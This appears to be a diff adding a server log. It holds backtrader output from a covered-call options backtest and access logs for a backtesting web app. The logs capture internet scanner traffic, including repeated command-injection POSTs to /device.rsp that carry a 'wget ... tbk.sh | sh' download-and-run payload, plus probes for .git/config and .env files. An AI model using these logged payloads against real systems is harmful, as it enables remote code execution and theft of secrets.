+2025-07-02  Buy/Sell 90005591, Price: 0.0723, Size: -10000, Cost: -723.0000, Comm 1.4460
+next 2025-07-02
+next 2025-07-03
+next 2025-07-04
+next 2025-07-07
+next 2025-07-08
+next 2025-07-09
+next 2025-07-10
+next 2025-07-11
+next 2025-07-14
+next 2025-07-15
+next 2025-07-16
+next 2025-07-17
+next 2025-07-18
+next 2025-07-21
+next 2025-07-22
+next 2025-07-23
+next 2025-07-24
+next 2025-07-25
+next 2025-07-28
+next 2025-07-29
+next 2025-07-30
+next 2025-07-31
+next 2025-08-01
+****************************************************************************************************
+notify_order Ref: 15
+OrdType: 0
+OrdType: Buy
+Status: 1
+Status: Submitted
+Size: 10000
+Price: None
+Price Limit: None
+TrailAmount: None
+TrailPercent: None
+ExecType: 0
+ExecType: Market
+CommInfo: None
+End of Session: 739464.9999999999
+Info: AutoOrderedDict({'ticker': '90005591'})
+Broker: None
+Alive: True
+****************************************************************************************************
+notify_order Ref: 16
+OrdType: 1
+OrdType: Sell
+Status: 1
+Status: Submitted
+Size: -10000
+Price: None
+Price Limit: None
+TrailAmount: None
+TrailPercent: None
+ExecType: 0
+ExecType: Market
+CommInfo: None
+End of Session: 739464.9999999999
+Info: AutoOrderedDict({'ticker': '90005607'})
+Broker: None
+Alive: True
+****************************************************************************************************
+notify_order Ref: 15
+OrdType: 0
+OrdType: Buy
+Status: 2
+Status: Accepted
+Size: 10000
+Price: None
+Price Limit: None
+TrailAmount: None
+TrailPercent: None
+ExecType: 0
+ExecType: Market
+CommInfo: None
+End of Session: 739464.9999999999
+Info: AutoOrderedDict({'ticker': '90005591'})
+Broker: None
+Alive: True
+****************************************************************************************************
+notify_order Ref: 16
+OrdType: 1
+OrdType: Sell
+Status: 2
+Status: Accepted
+Size: -10000
+Price: None
+Price Limit: None
+TrailAmount: None
+TrailPercent: None
+ExecType: 0
+ExecType: Market
+CommInfo: None
+End of Session: 739464.9999999999
+Info: AutoOrderedDict({'ticker': '90005607'})
+Broker: None
+Alive: True
+****************************************************************************************************
+notify_order Ref: 15
+OrdType: 0
+OrdType: Buy
+Status: 4
+Status: Completed
+Size: 10000
+Price: None
+Price Limit: None
+TrailAmount: None
+TrailPercent: None
+ExecType: 0
+ExecType: Market
+CommInfo: <backtrader.comminfo.CommInfoBase object at 0x769821142d50>
+End of Session: 739464.9999999999
+Info: AutoOrderedDict({'ticker': '90005591'})
+Broker: None
+Alive: False
+2025-08-04  Buy/Sell 90005591, Price: 0.1121, Size:  10000, Cost: -723.0000, Comm 2.2420
+****************************************************************************************************
+notify_order Ref: 16
+OrdType: 1
+OrdType: Sell
+Status: 4
+Status: Completed
+Size: -10000
+Price: None
+Price Limit: None
+TrailAmount: None
+TrailPercent: None
+ExecType: 0
+ExecType: Market
+CommInfo: <backtrader.comminfo.CommInfoBase object at 0x769821142d50>
+End of Session: 739464.9999999999
+Info: AutoOrderedDict({'ticker': '90005607'})
+Broker: None
+Alive: False
+2025-08-04  Buy/Sell 90005607, Price: 0.0830, Size: -10000, Cost: -830.0000, Comm 1.6600
+next 2025-08-04
+next 2025-08-05
+next 2025-08-06
+next 2025-08-07
+next 2025-08-08
+next 2025-08-11
+next 2025-08-12
+next 2025-08-13
+next 2025-08-14
+next 2025-08-15
+next 2025-08-18
+next 2025-08-19
+next 2025-08-20
+next 2025-08-21
+next 2025-08-22
+next 2025-08-25
+next 2025-08-26
+next 2025-08-27
+next 2025-08-28
+next 2025-08-29
+next 2025-09-01
+****************************************************************************************************
+notify_order Ref: 17
+OrdType: 0
+OrdType: Buy
+Status: 1
+Status: Submitted
+Size: 10000
+Price: None
+Price Limit: None
+TrailAmount: None
+TrailPercent: None
+ExecType: 0
+ExecType: Market
+CommInfo: None
+End of Session: 739495.9999999999
+Info: AutoOrderedDict({'ticker': '90005607'})
+Broker: None
+Alive: True
+****************************************************************************************************
+notify_order Ref: 18
+OrdType: 1
+OrdType: Sell
+Status: 1
+Status: Submitted
+Size: -10000
+Price: None
+Price Limit: None
+TrailAmount: None
+TrailPercent: None
+ExecType: 0
+ExecType: Market
+CommInfo: None
+End of Session: 739495.9999999999
+Info: AutoOrderedDict({'ticker': '90006167'})
+Broker: None
+Alive: True
+****************************************************************************************************
+notify_order Ref: 17
+OrdType: 0
+OrdType: Buy
+Status: 2
+Status: Accepted
+Size: 10000
+Price: None
+Price Limit: None
+TrailAmount: None
+TrailPercent: None
+ExecType: 0
+ExecType: Market
+CommInfo: None
+End of Session: 739495.9999999999
+Info: AutoOrderedDict({'ticker': '90005607'})
+Broker: None
+Alive: True
+****************************************************************************************************
+notify_order Ref: 18
+OrdType: 1
+OrdType: Sell
+Status: 2
+Status: Accepted
+Size: -10000
+Price: None
+Price Limit: None
+TrailAmount: None
+TrailPercent: None
+ExecType: 0
+ExecType: Market
+CommInfo: None
+End of Session: 739495.9999999999
+Info: AutoOrderedDict({'ticker': '90006167'})
+Broker: None
+Alive: True
+****************************************************************************************************
+notify_order Ref: 17
+OrdType: 0
+OrdType: Buy
+Status: 4
+Status: Completed
+Size: 10000
+Price: None
+Price Limit: None
+TrailAmount: None
+TrailPercent: None
+ExecType: 0
+ExecType: Market
+CommInfo: <backtrader.comminfo.CommInfoBase object at 0x769821142d50>
+End of Session: 739495.9999999999
+Info: AutoOrderedDict({'ticker': '90005607'})
+Broker: None
+Alive: False
+2025-09-02  Buy/Sell 90005607, Price: 0.3457, Size:  10000, Cost: -830.0000, Comm 6.9140
+****************************************************************************************************
+notify_order Ref: 18
+OrdType: 1
+OrdType: Sell
+Status: 4
+Status: Completed
+Size: -10000
+Price: None
+Price Limit: None
+TrailAmount: None
+TrailPercent: None
+ExecType: 0
+ExecType: Market
+CommInfo: <backtrader.comminfo.CommInfoBase object at 0x769821142d50>
+End of Session: 739495.9999999999
+Info: AutoOrderedDict({'ticker': '90006167'})
+Broker: None
+Alive: False
+2025-09-02  Buy/Sell 90006167, Price: 0.0750, Size: -10000, Cost: -750.0000, Comm 1.5000
+next 2025-09-02
+next 2025-09-03
+next 2025-09-04
+next 2025-09-05
+next 2025-09-08
+next 2025-09-09
+next 2025-09-10
+next 2025-09-11
+next 2025-09-12
+[<strategies.covered_call.CoveredCall object at 0x76981be3e900>]
+OrderedDict({'rtot': 0.01089442367112528, 'ravg': 6.983604917388e-05, 'rnorm': 0.017754453674449094, 'rnorm100': 1.7754453674449093})
+AutoOrderedDict({'len': 0, 'drawdown': 0.0, 'moneydown': 0.0, 'max': AutoOrderedDict({'len': 28, 'drawdown': 0.4888684000000008, 'moneydown': 2444.342000000004})})
+OrderedDict({'sharperatio': None})
+INFO:     124.217.189.200:54135 - "POST /api/backtest HTTP/1.1" 200 OK
+WARNING:  Invalid HTTP request received.
+WARNING:  Invalid HTTP request received.
+WARNING:  Invalid HTTP request received.
+WARNING:  Invalid HTTP request received.
+WARNING:  Invalid HTTP request received.
+WARNING:  Invalid HTTP request received.
+WARNING:  Invalid HTTP request received.
+WARNING:  Invalid HTTP request received.
+WARNING:  Invalid HTTP request received.
+WARNING:  Invalid HTTP request received.
+WARNING:  Invalid HTTP request received.
+WARNING:  Invalid HTTP request received.
+WARNING:  Invalid HTTP request received.
+WARNING:  Invalid HTTP request received.
+WARNING:  Invalid HTTP request received.
+WARNING:  Invalid HTTP request received.
+WARNING:  Invalid HTTP request received.
+WARNING:  Invalid HTTP request received.
+WARNING:  Invalid HTTP request received.
+WARNING:  Invalid HTTP request received.
+WARNING:  Invalid HTTP request received.
+WARNING:  Invalid HTTP request received.
+WARNING:  Invalid HTTP request received.
+WARNING:  Invalid HTTP request received.
+WARNING:  Invalid HTTP request received.
+WARNING:  Invalid HTTP request received.
+WARNING:  Invalid HTTP request received.
+WARNING:  Invalid HTTP request received.
+WARNING:  Invalid HTTP request received.
+WARNING:  Invalid HTTP request received.
+WARNING:  Invalid HTTP request received.
+WARNING:  Invalid HTTP request received.
+WARNING:  Invalid HTTP request received.
+WARNING:  Invalid HTTP request received.
+WARNING:  Invalid HTTP request received.
+WARNING:  Invalid HTTP request received.
+WARNING:  Invalid HTTP request received.
+WARNING:  Invalid HTTP request received.
+WARNING:  Invalid HTTP request received.
+WARNING:  Invalid HTTP request received.
+WARNING:  Invalid HTTP request received.
+INFO:     142.252.248.27:56718 - "GET / HTTP/1.1" 200 OK
+INFO:     124.217.189.200:53718 - "GET / HTTP/1.1" 200 OK
+INFO:     124.217.189.200:59428 - "GET / HTTP/1.1" 200 OK
+INFO:     124.217.189.200:59791 - "GET / HTTP/1.1" 200 OK
+INFO:     124.217.189.200:58899 - "GET /api/strategies/sma_cross1/params HTTP/1.1" 200 OK
+[{'strategy_name': 'sma_cross1', 'result_id': '20250819_062300', 'params': {'short_sma': '10', 'long_sma': '20'}, 'timestamp': '2025-08-19T06:23:00.946443', 'html_path': 'results/sma_cross1/sma_cross1_20250819_062300.html', 'json_path': 'results/sma_cross1/sma_cross1_20250819_062300.json', 'report_path': 'results/sma_cross1/sma_cross1_20250819_062300_report.html', 'pf_report_path': 'results/sma_cross1/sma_cross1_20250819_062300_pf_report.html'}, {'strategy_name': 'sma_cross1', 'result_id': '20250819_062231', 'params': {'short_sma': '5', 'long_sma': '20'}, 'timestamp': '2025-08-19T06:22:31.817306', 'html_path': 'results/sma_cross1/sma_cross1_20250819_062231.html', 'json_path': 'results/sma_cross1/sma_cross1_20250819_062231.json', 'report_path': 'results/sma_cross1/sma_cross1_20250819_062231_report.html', 'pf_report_path': 'results/sma_cross1/sma_cross1_20250819_062231_pf_report.html'}, {'strategy_name': 'sma_cross1', 'result_id': '20250819_074442', 'params': {'short_sma': '10', 'long_sma': '20'}, 'timestamp': '2025-08-19T07:44:42.621089', 'html_path': 'results/sma_cross1/sma_cross1_20250819_074442.html', 'json_path': 'results/sma_cross1/sma_cross1_20250819_074442.json', 'report_path': 'results/sma_cross1/sma_cross1_20250819_074442_report.html', 'pf_report_path': 'results/sma_cross1/sma_cross1_20250819_074442_pf_report.html'}, {'strategy_name': 'sma_cross1', 'result_id': '20250826_031623', 'params': {'short_sma': '10', 'long_sma': '20'}, 'timestamp': '2025-08-26T03:16:23.776078', 'html_path': 'results/sma_cross1/sma_cross1_20250826_031623.html', 'json_path': 'results/sma_cross1/sma_cross1_20250826_031623.json', 'report_path': 'results/sma_cross1/sma_cross1_20250826_031623_report.html', 'pf_report_path': 'results/sma_cross1/sma_cross1_20250826_031623_pf_report.html'}, {'strategy_name': 'sma_cross1', 'result_id': '20250924_022442', 'params': {'short_sma': '10', 'long_sma': '20'}, 'timestamp': '2025-09-24T02:24:42.558955', 'html_path': 'results/sma_cross1/sma_cross1_20250924_022442.html', 'json_path': 'results/sma_cross1/sma_cross1_20250924_022442.json', 'report_path': 'results/sma_cross1/sma_cross1_20250924_022442_report.html', 'pf_report_path': 'results/sma_cross1/sma_cross1_20250924_022442_pf_report.html'}, {'strategy_name': 'sma_cross1', 'result_id': '20250819_074450', 'params': {'short_sma': '10', 'long_sma': '20'}, 'timestamp': '2025-08-19T07:44:50.984757', 'html_path': 'results/sma_cross1/sma_cross1_20250819_074450.html', 'json_path': 'results/sma_cross1/sma_cross1_20250819_074450.json', 'report_path': 'results/sma_cross1/sma_cross1_20250819_074450_report.html', 'pf_report_path': 'results/sma_cross1/sma_cross1_20250819_074450_pf_report.html'}, {'strategy_name': 'sma_cross1', 'result_id': '20250923_080910', 'params': {'short_sma': '10', 'long_sma': '20'}, 'timestamp': '2025-09-23T08:09:10.186954', 'html_path': 'results/sma_cross1/sma_cross1_20250923_080910.html', 'json_path': 'results/sma_cross1/sma_cross1_20250923_080910.json', 'report_path': 'results/sma_cross1/sma_cross1_20250923_080910_report.html', 'pf_report_path': 'results/sma_cross1/sma_cross1_20250923_080910_pf_report.html'}, {'strategy_name': 'sma_cross1', 'result_id': '20250819_074446', 'params': {'short_sma': '10', 'long_sma': '20'}, 'timestamp': '2025-08-19T07:44:46.856439', 'html_path': 'results/sma_cross1/sma_cross1_20250819_074446.html', 'json_path': 'results/sma_cross1/sma_cross1_20250819_074446.json', 'report_path': 'results/sma_cross1/sma_cross1_20250819_074446_report.html', 'pf_report_path': 'results/sma_cross1/sma_cross1_20250819_074446_pf_report.html'}]
+INFO:     124.217.189.200:58900 - "GET /api/records?strategies_name=sma_cross1 HTTP/1.1" 200 OK
+[{'strategy_name': 'covered_call', 'result_id': '20250925_144748', 'params': {'cash': '500000', 'commission': '0.002', 'begin_time': '2025-04-01', 'end_time': '2025-09-25', 'code': '300etf'}, 'timestamp': '2025-09-25T14:47:48.475203', 'html_path': 'results/covered_call/covered_call_20250925_144748.html', 'json_path': 'results/covered_call/covered_call_20250925_144748.json', 'report_path': 'results/covered_call/covered_call_20250925_144748_report.html', 'pf_report_path': 'results/covered_call/covered_call_20250925_144748_pf_report.html'}, {'strategy_name': 'covered_call', 'result_id': '20250924_022434', 'params': {'cash': '500000', 'commission': '0.002', 'begin_time': '2025-04-01', 'end_time': '2025-09-25', 'code': '300etf'}, 'timestamp': '2025-09-24T02:24:34.486132', 'html_path': 'results/covered_call/covered_call_20250924_022434.html', 'json_path': 'results/covered_call/covered_call_20250924_022434.json', 'report_path': 'results/covered_call/covered_call_20250924_022434_report.html', 'pf_report_path': 'results/covered_call/covered_call_20250924_022434_pf_report.html'}, {'strategy_name': 'covered_call', 'result_id': '20250924_015209', 'params': {'cash': '500000', 'commission': '0.002', 'begin_time': '2025-04-01', 'end_time': '2025-09-25', 'code': '300etf'}, 'timestamp': '2025-09-24T01:52:09.293785', 'html_path': 'results/covered_call/covered_call_20250924_015209.html', 'json_path': 'results/covered_call/covered_call_20250924_015209.json', 'report_path': 'results/covered_call/covered_call_20250924_015209_report.html', 'pf_report_path': 'results/covered_call/covered_call_20250924_015209_pf_report.html'}]
+INFO:     124.217.189.200:64839 - "GET /api/records?strategies_name=covered_call HTTP/1.1" 200 OK
+INFO:     124.217.189.200:64838 - "GET /api/strategies/covered_call/params HTTP/1.1" 200 OK
+INFO:     124.217.189.200:50940 - "GET /api/strategies/sma_cross/params HTTP/1.1" 200 OK
+INFO:     124.217.189.200:55448 - "GET / HTTP/1.1" 200 OK
+[{'strategy_name': 'sma_cross', 'result_id': '20250819_061849', 'params': {'short_sma': '10', 'long_sma': '20'}, 'timestamp': '2025-08-19T06:18:49.059740', 'html_path': 'results/sma_cross/sma_cross_20250819_061849.html', 'json_path': 'results/sma_cross/sma_cross_20250819_061849.json', 'report_path': 'results/sma_cross/sma_cross_20250819_061849_report.html', 'pf_report_path': 'results/sma_cross/sma_cross_20250819_061849_pf_report.html'}, {'strategy_name': 'sma_cross', 'result_id': '20250819_130055', 'params': {'short_sma': '10', 'long_sma': '20'}, 'timestamp': '2025-08-19T13:00:55.163128', 'html_path': 'results/sma_cross/sma_cross_20250819_130055.html', 'json_path': 'results/sma_cross/sma_cross_20250819_130055.json', 'report_path': 'results/sma_cross/sma_cross_20250819_130055_report.html', 'pf_report_path': 'results/sma_cross/sma_cross_20250819_130055_pf_report.html'}, {'strategy_name': 'sma_cross', 'result_id': '20250819_130050', 'params': {'short_sma': '10', 'long_sma': '20'}, 'timestamp': '2025-08-19T13:00:50.857781', 'html_path': 'results/sma_cross/sma_cross_20250819_130050.html', 'json_path': 'results/sma_cross/sma_cross_20250819_130050.json', 'report_path': 'results/sma_cross/sma_cross_20250819_130050_report.html', 'pf_report_path': 'results/sma_cross/sma_cross_20250819_130050_pf_report.html'}]
+INFO:     124.217.189.200:55447 - "GET /api/records?strategies_name=sma_cross HTTP/1.1" 200 OK
+INFO:     124.217.189.200:55695 - "GET / HTTP/1.1" 200 OK
+INFO:     124.217.189.200:65338 - "GET / HTTP/1.1" 200 OK
+INFO:     124.217.189.200:51805 - "GET / HTTP/1.1" 200 OK
+INFO:      - "GET / HTTP/1.1" 200 OK
+INFO:     87.236.176.177:44113 - "GET / HTTP/1.0" 200 OK
+INFO:      - "GET /nice%20ports%2C/Trinity.txt.bak HTTP/1.0" 404 Not Found
+INFO:     152.32.181.210:59972 - "GET / HTTP/1.1" 200 OK
+INFO:     198.235.24.122:63654 - "GET / HTTP/1.1" 200 OK
+INFO:     165.227.66.87:50256 - "GET / HTTP/1.1" 200 OK
+INFO:     124.198.131.145:47668 - "GET / HTTP/1.1" 200 OK
+INFO:     3.134.148.59:46838 - "GET / HTTP/1.1" 200 OK
+INFO:      - "GET / HTTP/1.1" 200 OK
+INFO:      - "GET / HTTP/1.1" 200 OK
+INFO:      - "GET / HTTP/1.1" 200 OK
+INFO:     77.83.240.111:39130 - "CONNECT curlmyip.net%3A443 HTTP/1.1" 404 Not Found
+INFO:     103.203.57.20:47396 - "GET / HTTP/1.1" 200 OK
+INFO:     103.203.57.20:48030 - "GET http%3A//clientapi.ipip.net/echo.php?info=20250925222158 HTTP/1.1" 404 Not Found
+INFO:     195.178.110.199:56220 - "GET / HTTP/1.1" 200 OK
+INFO:     195.178.110.199:58280 - "GET / HTTP/1.1" 200 OK
+INFO:     195.178.110.199:58290 - "GET / HTTP/1.1" 200 OK
+INFO:      - "GET / HTTP/1.1" 200 OK
+INFO:     124.217.189.200:49174 - "GET /results/covered_call/covered_call_20250924_022434_pf_report.html HTTP/1.1" 200 OK
+INFO:     124.217.189.200:60632 - "GET /results/covered_call/covered_call_20250924_022434_report.html HTTP/1.1" 404 Not Found
+INFO:     124.217.189.200:57488 - "GET /results/covered_call/covered_call_20250924_022434_pf_report.html HTTP/1.1" 200 OK
+WARNING:  Invalid HTTP request received.
+INFO:     91.230.168.241:45369 - "GET / HTTP/1.1" 200 OK
+INFO:     147.185.132.219:64392 - "GET / HTTP/1.1" 200 OK
+INFO:     124.198.132.121:46236 - "GET / HTTP/1.1" 200 OK
+WARNING:  Invalid HTTP request received.
+INFO:     124.198.132.121:46256 - "POST /device.rsp?opt=sys&cmd=___S_O_S_T_R_E_A_MAX___&mdb=sos&mdc=wget%20http%3A%2F%2F45.125.66.56%2Ftbk.sh%20-O-%20%7C%20sh HTTP/1.1" 404 Not Found
+INFO:     124.198.132.121:46272 - "GET / HTTP/1.0" 200 OK
+INFO:     124.198.132.121:46282 - "POST /ws/v1/cluster/apps/new-application HTTP/1.1" 404 Not Found
+WARNING:  Invalid HTTP request received.
+INFO:     124.198.132.121:46298 - "POST /device.rsp?opt=sys&cmd=___S_O_S_T_R_E_A_MAX___&mdb=sos&mdc=wget%20http%3A%2F%2F45.125.66.56%2Ftbk.sh%20-O-%20%7C%20sh HTTP/1.1" 404 Not Found
+INFO:     124.198.132.121:46302 - "GET / HTTP/1.0" 200 OK
+INFO:     124.198.132.121:46316 - "POST /ws/v1/cluster/apps/new-application HTTP/1.1" 404 Not Found
+INFO:     207.90.244.14:36126 - "GET / HTTP/1.1" 200 OK
+INFO:     207.90.244.14:36140 - "GET /favicon.ico HTTP/1.1" 404 Not Found
+WARNING:  Invalid HTTP request received.
+INFO:     91.196.152.156:38035 - "GET / HTTP/1.1" 200 OK
+INFO:     91.196.152.150:51707 - "GET /favicon.ico HTTP/1.1" 404 Not Found
+INFO:     52.167.144.59:15386 - "GET /robots.txt HTTP/1.1" 404 Not Found
+INFO:     207.46.13.151:56984 - "GET / HTTP/1.1" 200 OK
+WARNING:  Invalid HTTP request received.
+WARNING:  Invalid HTTP request received.
+WARNING:  Invalid HTTP request received.
+INFO:     162.243.162.9:49100 - "GET / HTTP/1.1" 200 OK
+INFO:     162.243.162.9:49102 - "GET /login HTTP/1.1" 404 Not Found
+INFO:     45.82.78.117:47666 - "GET /.git/config HTTP/1.1" 404 Not Found
+WARNING:  Invalid HTTP request received.
+INFO:     64.62.156.192:19926 - "GET / HTTP/1.1" 200 OK
+INFO:     64.62.156.192:30539 - "GET /favicon.ico HTTP/1.1" 404 Not Found
+INFO:     64.62.156.201:20795 - "GET http%3A//api.ipify.org/?format=json HTTP/1.1" 404 Not Found
+INFO:     64.62.156.201:60971 - "CONNECT www.shadowserver.org%3A443 HTTP/1.1" 404 Not Found
+INFO:     66.132.153.135:45116 - "GET / HTTP/1.1" 200 OK
+INFO:     66.132.153.135:45122 - "GET /favicon.ico HTTP/1.1" 404 Not Found
+INFO:     66.132.153.135:45138 - "PRI %2A HTTP/2.0" 404 Not Found
+WARNING:  Invalid HTTP request received.
+INFO:     66.132.153.135:41206 - "PRI %2A HTTP/2.0" 404 Not Found
+WARNING:  Invalid HTTP request received.
+INFO:     66.132.153.135:41214 - "GET /favicon.ico HTTP/1.1" 404 Not Found
+INFO:     66.132.153.135:41526 - "GET /security.txt HTTP/1.1" 404 Not Found
+INFO:     173.230.153.69:42886 - "CONNECT curlmyip.net%3A443 HTTP/1.1" 404 Not Found
+INFO:     205.210.31.221:58012 - "GET / HTTP/1.1" 200 OK
+INFO:     91.230.168.197:37865 - "GET /favicon.ico HTTP/1.1" 404 Not Found
+INFO:     167.94.145.100:54186 - "GET / HTTP/1.1" 200 OK
+INFO:     167.94.145.100:34840 - "GET / HTTP/1.1" 200 OK
+INFO:     167.94.145.100:34848 - "GET /favicon.ico HTTP/1.1" 404 Not Found
+INFO:     167.94.145.100:34860 - "PRI %2A HTTP/2.0" 404 Not Found
+WARNING:  Invalid HTTP request received.
+INFO:     167.94.145.100:34958 - "PRI %2A HTTP/2.0" 404 Not Found
+WARNING:  Invalid HTTP request received.
+INFO:     167.94.145.100:34966 - "GET /favicon.ico HTTP/1.1" 404 Not Found
+INFO:     167.94.145.100:57266 - "GET /robots.txt HTTP/1.1" 404 Not Found
+WARNING:  Invalid HTTP request received.
+WARNING:  Invalid HTTP request received.
+INFO:     207.90.244.28:48446 - "GET / HTTP/1.1" 200 OK
+INFO:     207.90.244.28:48460 - "GET /favicon.ico HTTP/1.1" 404 Not Found
+INFO:     174.138.43.75:56348 - "GET / HTTP/1.1" 200 OK
+INFO:     146.190.134.221:49966 - "POST /api/client/update?arch=amd64&commit=08059e95dacafe0bf6e5782f8e2c8ec9cd8c5a17&os=windows HTTP/1.1" 404 Not Found
+INFO:     54.177.201.62:60406 - "GET / HTTP/1.1" 200 OK
+WARNING:  Invalid HTTP request received.
+INFO:     111.113.88.245:21929 - "GET / HTTP/1.1" 200 OK
+INFO:     122.96.28.153:43407 - "GET / HTTP/1.1" 200 OK
+INFO:     3.130.96.91:46994 - "GET / HTTP/1.1" 200 OK
+WARNING:  Invalid HTTP request received.
+INFO:     3.130.96.91:54504 - "GET / HTTP/1.1" 200 OK
+WARNING:  Invalid HTTP request received.
+WARNING:  Invalid HTTP request received.
+INFO:     204.76.203.29:35080 - "CONNECT cfdump.packetsdatabase.com%3A443 HTTP/1.1" 404 Not Found
+INFO:     198.235.24.216:64714 - "GET / HTTP/1.1" 200 OK
+INFO:     64.62.197.152:2844 - "GET / HTTP/1.1" 200 OK
+INFO:     64.62.197.162:11645 - "GET /favicon.ico HTTP/1.1" 404 Not Found
+INFO:     64.62.197.155:56821 - "GET http%3A//api.ipify.org/?format=json HTTP/1.1" 404 Not Found
+INFO:     64.62.197.159:43091 - "CONNECT www.shadowserver.org%3A443 HTTP/1.1" 404 Not Found
+INFO:     124.217.189.200:60672 - "GET / HTTP/1.1" 200 OK
+INFO:     124.217.189.200:51532 - "GET /static/bootstrap.min.css HTTP/1.1" 200 OK
+INFO:     124.217.189.200:51532 - "GET /api/strategies HTTP/1.1" 200 OK
+INFO:     124.217.189.200:49682 - "GET /favicon.ico HTTP/1.1" 404 Not Found
+[{'strategy_name': 'covered_call', 'result_id': '20250925_144748', 'params': {'cash': '500000', 'commission': '0.002', 'begin_time': '2025-04-01', 'end_time': '2025-09-25', 'code': '300etf'}, 'timestamp': '2025-09-25T14:47:48.475203', 'html_path': 'results/covered_call/covered_call_20250925_144748.html', 'json_path': 'results/covered_call/covered_call_20250925_144748.json', 'report_path': 'results/covered_call/covered_call_20250925_144748_report.html', 'pf_report_path': 'results/covered_call/covered_call_20250925_144748_pf_report.html'}, {'strategy_name': 'covered_call', 'result_id': '20250924_022434', 'params': {'cash': '500000', 'commission': '0.002', 'begin_time': '2025-04-01', 'end_time': '2025-09-25', 'code': '300etf'}, 'timestamp': '2025-09-24T02:24:34.486132', 'html_path': 'results/covered_call/covered_call_20250924_022434.html', 'json_path': 'results/covered_call/covered_call_20250924_022434.json', 'report_path': 'results/covered_call/covered_call_20250924_022434_report.html', 'pf_report_path': 'results/covered_call/covered_call_20250924_022434_pf_report.html'}, {'strategy_name': 'covered_call', 'result_id': '20250924_015209', 'params': {'cash': '500000', 'commission': '0.002', 'begin_time': '2025-04-01', 'end_time': '2025-09-25', 'code': '300etf'}, 'timestamp': '2025-09-24T01:52:09.293785', 'html_path': 'results/covered_call/covered_call_20250924_015209.html', 'json_path': 'results/covered_call/covered_call_20250924_015209.json', 'report_path': 'results/covered_call/covered_call_20250924_015209_report.html', 'pf_report_path': 'results/covered_call/covered_call_20250924_015209_pf_report.html'}]
+INFO:     124.217.189.200:51532 - "GET /api/records?strategies_name=covered_call HTTP/1.1" 200 OK
+INFO:     124.217.189.200:49682 - "GET /api/strategies/covered_call/params HTTP/1.1" 200 OK
+INFO:     124.217.189.200:51532 - "GET /results/covered_call/covered_call_20250925_144748_report.html HTTP/1.1" 404 Not Found
+INFO:     124.217.189.200:51532 - "GET /results/covered_call/covered_call_20250925_144748_pf_report.html HTTP/1.1" 200 OK
+INFO:     124.217.189.200:51532 - "GET /results/covered_call/covered_call_20250924_022434_report.html HTTP/1.1" 404 Not Found
+INFO:     107.174.119.18:53610 - "GET / HTTP/1.1" 200 OK
+INFO:     205.210.31.26:57406 - "GET / HTTP/1.1" 200 OK
+WARNING:  Invalid HTTP request received.
+INFO:     157.55.39.203:62089 - "GET / HTTP/1.1" 200 OK
+INFO:     124.198.131.112:43868 - "GET / HTTP/1.1" 200 OK
+WARNING:  Invalid HTTP request received.
+INFO:     124.198.131.112:43880 - "POST /device.rsp?opt=sys&cmd=___S_O_S_T_R_E_A_MAX___&mdb=sos&mdc=wget%20http%3A%2F%2F45.125.66.56%2Ftbk.sh%20-O-%20%7C%20sh HTTP/1.1" 404 Not Found
+INFO:     124.198.131.112:51774 - "GET / HTTP/1.0" 200 OK
+INFO:     124.198.131.112:51782 - "POST /ws/v1/cluster/apps/new-application HTTP/1.1" 404 Not Found
+WARNING:  Invalid HTTP request received.
+INFO:     124.198.131.112:51808 - "POST /device.rsp?opt=sys&cmd=___S_O_S_T_R_E_A_MAX___&mdb=sos&mdc=wget%20http%3A%2F%2F45.125.66.56%2Ftbk.sh%20-O-%20%7C%20sh HTTP/1.1" 404 Not Found
+INFO:     124.198.131.112:51810 - "GET / HTTP/1.0" 200 OK
+INFO:     124.198.131.112:51820 - "POST /ws/v1/cluster/apps/new-application HTTP/1.1" 404 Not Found
+WARNING:  Invalid HTTP request received.
+WARNING:  Invalid HTTP request received.
+INFO:     167.71.208.80:38162 - "GET / HTTP/1.1" 200 OK
+INFO:     167.71.208.80:38178 - "GET /login HTTP/1.1" 404 Not Found
+INFO:     146.148.26.145:46780 - "GET / HTTP/1.1" 200 OK
+INFO:     23.185.120.114:58004 - "GET /v1/kv/?keys HTTP/1.1" 404 Not Found
+INFO:     23.185.120.114:58004 - "GET /swagger.json HTTP/1.1" 404 Not Found
+INFO:     23.185.120.114:58004 - "GET /.git/config HTTP/1.1" 404 Not Found
+INFO:     23.185.120.114:58004 - "GET /.svn/entries HTTP/1.1" 404 Not Found
+INFO:     23.185.120.114:58004 - "GET /server-status HTTP/1.1" 404 Not Found
+INFO:     23.185.120.114:58004 - "GET /v2/_catalog HTTP/1.1" 404 Not Found
+INFO:     23.185.120.114:58004 - "GET /.env HTTP/1.1" 404 Not Found
+INFO:     23.185.120.114:58004 - "GET /_cat/indices HTTP/1.1" 404 Not Found
+INFO:     23.185.120.114:58004 - "GET /api-docs.json HTTP/1.1" 404 Not Found
+INFO:     23.185.120.114:58004 - "GET /.svn/wc.db HTTP/1.1" 404 Not Found
+INFO:     23.185.120.114:58004 - "GET /openapi.json HTTP/1.1" 200 OK
+INFO:     124.217.189.200:56028 - "HEAD /FRJRcUIQYgq4z8tZ2yADiyg5y3LDoz5qfOTVeN5AgCHvkJf6cO8R7bOWsy9YmJWlYat7DLPX46D58v0m4JFEInQ5KRXy8ePZqgLDjLhJTAtqiwZkK3XNHKwieFUdGeutpn80GGM1SYsCoHl6XMvE5JM6kPXHCdknBog5bf65kdY%3D HTTP/1.1" 404 Not Found
+INFO:     124.217.189.200:56027 - "HEAD /teAY906QwUWmHJ5ca19VdZlOZF-gbXvVgyXYqKrKoX4CnR1b6lX6-eUKQJFOLNpSa86pXsBYYXTbvJ-MjYdSyBifCfuinbcrLqa84eUzrNtdbXgXFiUG95DPDu11NL7ZPQEWJDtODlSAB1qEGtM0sbyq0Y756RvfHgC2bROqjHA%3D HTTP/1.1" 404 Not Found
+WARNING:  Invalid HTTP request received.
+INFO:     147.185.132.106:59080 - "GET / HTTP/1.1" 200 OK
+WARNING:  Invalid HTTP request received.
+WARNING:  Invalid HTTP request received.
+WARNING:  Invalid HTTP request received.
+WARNING:  Invalid HTTP request received.
+WARNING:  Invalid HTTP request received.
+WARNING:  Invalid HTTP request received.
+WARNING:  Invalid HTTP request received.
+WARNING:  Invalid HTTP request received.
+WARNING:  Invalid HTTP request received.
+WARNING:  Invalid HTTP request received.
+WARNING:  Invalid HTTP request received.
+WARNING:  Invalid HTTP request received.
+WARNING:  Invalid HTTP request received.
+WARNING:  Invalid HTTP request received.
+WARNING:  Invalid HTTP request received.
+WARNING:  Invalid HTTP request received.
+WARNING:  Invalid HTTP request received.
+WARNING:  Invalid HTTP request received.
+WARNING:  Invalid HTTP request received.
+WARNING:  Invalid HTTP request received.
+INFO:     167.94.138.50:47408 - "GET / HTTP/1.1" 200 OK
